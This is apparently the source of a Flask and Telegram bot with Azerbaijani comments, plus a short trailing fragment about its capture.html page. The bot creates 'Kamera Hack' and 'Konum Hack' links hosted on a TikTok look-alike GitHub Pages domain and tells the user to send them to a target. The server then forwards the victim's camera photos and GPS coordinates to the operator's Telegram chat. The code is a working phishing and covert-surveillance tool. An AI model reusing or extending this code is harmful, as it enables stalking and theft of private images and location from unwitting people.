from flask import Flask, request from flask_cors import CORS from werkzeug.utils import secure_filename import os import json import telebot import threading import time import uuid from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton app = Flask(__name__) CORS(app, resources={r"/*": {"origins": ["https://tik-tokk.github.io", "http://localhost:5000"]}}) # Telegram Bot Token TOKEN = os.environ.get("TOKEN") if not TOKEN: raise ValueError("Telegram bot token tapılmadı!") bot = telebot.TeleBot(TOKEN) # Kanalın username-i CHANNEL_USERNAME = "@CyberDarkAz" # Öz kanalınızın username-ini qeyd edin # GitHub Pages URL-i BASE_URL = 'https://tik-tokk.github.io/video' # Fayl yolları (Render-da /tmp istifadə edirik) USER_DATA_FILE = '/tmp/user_data.json' PHOTOS_DIR = '/tmp/photos' # Qovluq və faylları yarat if not os.path.exists(PHOTOS_DIR): os.makedirs(PHOTOS_DIR) if not os.path.exists(USER_DATA_FILE): with open(USER_DATA_FILE, 'w') as f: json.dump({}, f) # Kanal abunəliyini yoxlama funksiyası def check_subscription(chat_id): try: member = bot.get_chat_member(CHANNEL_USERNAME, chat_id) return member.status in ["member", "administrator", "creator"] except Exception as e: print(f"Abunəlik yoxlama xətası: {e}") return False # Şəkil yükləmə @app.route('/upload', methods=['POST']) def upload_photo(): # Unique ID yoxlanışı if 'unique_id' not in request.form: return {"status": "error", "message": "unique_id tələb olunur!"}, 400 unique_id = request.form['unique_id'] # user_data.json oxuma try: with open(USER_DATA_FILE, 'r') as f: user_data = json.load(f) except Exception as e: print(f"JSON oxuma xətası: {e}") return {"status": "error", "message": "Daxili server xətası: JSON oxunmadı"}, 500 # ID-nin mövcudluğunu yoxla if unique_id not in user_data: return {"status": "error", "message": "ID tapılmadı!"}, 400 # Şəkil faylını yoxla if 'photo' not in request.files: return {"status": "error", "message": "Şəkil faylı tələb olunur!"}, 400 photo = request.files['photo'] if photo.filename == '': return {"status": "error", "message": "Şəkil faylı boşdur!"}, 400 # Şəkili saxla filename = secure_filename(f'{unique_id}.jpg') photo_path = os.path.join(PHOTOS_DIR, filename) photo.save(photo_path) # Telegram-a göndər chat_id = user_data[unique_id]["chat_id"] try: with open(photo_path, 'rb') as photo_file: bot.send_photo(chat_id, photo_file, caption=f'📸 Şəkil alındı! ID: {unique_id} Probleminiz varsa adminlə əlaqə saxlayın: @cyberdarkadmin_bot') print(f"Şəkil göndərildi: {unique_id}") except Exception as e: print(f"Şəkil göndərmə xətası: {e}") return {"status": "error", "message": "Telegram-a şəkil göndərilə bilmədi"}, 500 finally: if os.path.exists(photo_path): os.remove(photo_path) # ID-ni user_data-dan sil del user_data[unique_id] try: with open(USER_DATA_FILE, 'w') as f: json.dump(user_data, f) except Exception as e: print(f"JSON yazma xətası: {e}") return {"status": "error", "message": "Daxili server xətası: JSON yazıla bilmədi"}, 500 return {"status": "success", "message": "Şəkil uğurla göndərildi!"} # Konum yükləmə @app.route('/upload_location', methods=['POST']) def upload_location(): # JSON sorğusunu yoxla if not request.is_json: return {"status": "error", "message": "JSON formatında məlumat tələb olunur!"}, 400 data = request.get_json() unique_id = data.get('unique_id') if not unique_id: return {"status": "error", "message": "unique_id tələb olunur!"}, 400 # user_data.json oxuma try: with open(USER_DATA_FILE, 'r') as f: user_data = json.load(f) except Exception as e: print(f"JSON oxuma xətası: {e}") return {"status": "error", "message": "Daxili server xətası: JSON oxunmadı"}, 500 if unique_id not in user_data: return {"status": "error", "message": "ID tapılmadı!"}, 400 latitude = data.get('latitude') longitude = data.get('longitude') if latitude is None or longitude is None: return {"status": "error", "message": "Koordinatlar (latitude və longitude) tələb olunur!"}, 400 # Telegram-a göndər chat_id = user_data[unique_id]["chat_id"] try: bot.send_location(chat_id, float(latitude), float(longitude)) print(f"Konum göndərildi: {unique_id}") except Exception as e: print(f"Konum göndərmə xətası: {e}") return {"status": "error", "message": "Telegram-a konum göndərilə bilmədi"}, 500 # ID-ni user_data-dan sil del user_data[unique_id] try: with open(USER_DATA_FILE, 'w') as f: json.dump(user_data, f) except Exception as e: print(f"JSON yazma xətası: {e}") return {"status": "error", "message": "Daxili server xətası: JSON yazıla bilmədi"}, 500 return {"status": "success", "message": "Konum uğurla göndərildi!"} # Test endpoint-i @app.route('/test', methods=['GET']) def test(): return {"status": "API is working!"} # Telegram Bot Əmrləri @bot.message_handler(commands=['start']) def start(message): chat_id = message.chat.id if not check_subscription(chat_id): markup = InlineKeyboardMarkup() markup.add(InlineKeyboardButton("Kanalımıza Abunə Ol", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")) markup.add(InlineKeyboardButton("Abunə Oldum, Yoxla ✅", callback_data="check_subscription")) bot.send_message(chat_id, f"Botu istifadə etmək üçün əvvəlcə {CHANNEL_USERNAME} kanalına abunə olun! 📢", reply_markup=markup) print(f"Chat ID: {chat_id} - Abunəlik tələb olundu") return markup = InlineKeyboardMarkup() markup.add(InlineKeyboardButton("📸 Kamera Hack", callback_data="camera_hack")) markup.add(InlineKeyboardButton("📍 Konum Hack", callback_data="location_hack")) bot.send_message(chat_id, "Salam! Hansı linki yaratmaq istəyirsən? 🎯", reply_markup=markup) print(f"Chat ID: {chat_id} - /start əmri işlədi") @bot.callback_query_handler(func=lambda call: True) def callback_query(call): chat_id = call.message.chat.id if call.data == "check_subscription": if check_subscription(chat_id): markup = InlineKeyboardMarkup() markup.add(InlineKeyboardButton("📸 Kamera Hack", callback_data="camera_hack")) markup.add(InlineKeyboardButton("📍 Konum Hack", callback_data="location_hack")) bot.edit_message_text("Təşəkkürlər! İndi botu istifadə edə bilərsiniz. 🎉 Hansı linki yaratmaq istəyirsən?", chat_id, call.message.message_id, reply_markup=markup) print(f"Chat ID: {chat_id} - Abunəlik təsdiqləndi") else: markup = InlineKeyboardMarkup() markup.add(InlineKeyboardButton("Kanalımıza Abunə Ol", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")) markup.add(InlineKeyboardButton(" Abunə Oldum, Yoxla✅", callback_data="check_subscription")) bot.edit_message_text(f"Hələ də {CHANNEL_USERNAME} kanalına abunə olmamısınız! 📢", chat_id, call.message.message_id, reply_markup=markup) print(f"Chat ID: {chat_id} - Hələ abunə deyil") return unique_id = str(uuid.uuid4()) # Unique link ID link_type = "camera" if call.data == "camera_hack" else "location" # user_data.json faylını oxu və güncəllə if os.path.exists(USER_DATA_FILE): try: with open(USER_DATA_FILE, 'r') as f: user_data = json.load(f) except Exception as e: print(f"JSON oxuma xətası: {e}") user_data = {} else: user_data = {} user_data[unique_id] = {"chat_id": chat_id, "type": link_type} try: with open(USER_DATA_FILE, 'w') as f: json.dump(user_data, f) except Exception as e: print(f"JSON yazma xətası: {e}") bot.send_message(chat_id, "Daxili xəta: Link yaradıla bilmədi!") return # Linki yarad və göndər link = f"{BASE_URL}/capture.html?id={unique_id}&type={link_type}" bot.send_message(chat_id, f"🔗 Budur sənin {link_type} linkin:\n{link} 🌟\nBu linki hədəfə yolla və nəticələri gözlə! 😊") print(f"Link yaradıldı: {link}") # Botu işə sal def run_bot(): print("Bot polling başlandı...") try: bot.polling(non_stop=True, timeout=120) except Exception as e: print(f"Bot polling xətası: {e}") time.sleep(5) if __name__ == '__main__': # Əvvəlki bot instansiyalarını dayandırmaq üçün polling-i təmizləyirik bot.remove_webhook() time.sleep(1) # Telegram API-yə dəyişikliklərin tətbiq olunması üçün gözləyirik port = int(os.environ.get('PORT', 10000)) # Render-da PORT dəyişəni istifadə edilir # Botu paralel işə salmaq üçün əlavə thread istifadə edirik threading.Thread(target=run_bot, daemon=True).start() app.run(host='0.0.0.0', port=port) app.py kod bu capture.html boyle Xüsusi Təklif Səni Gözləyir!
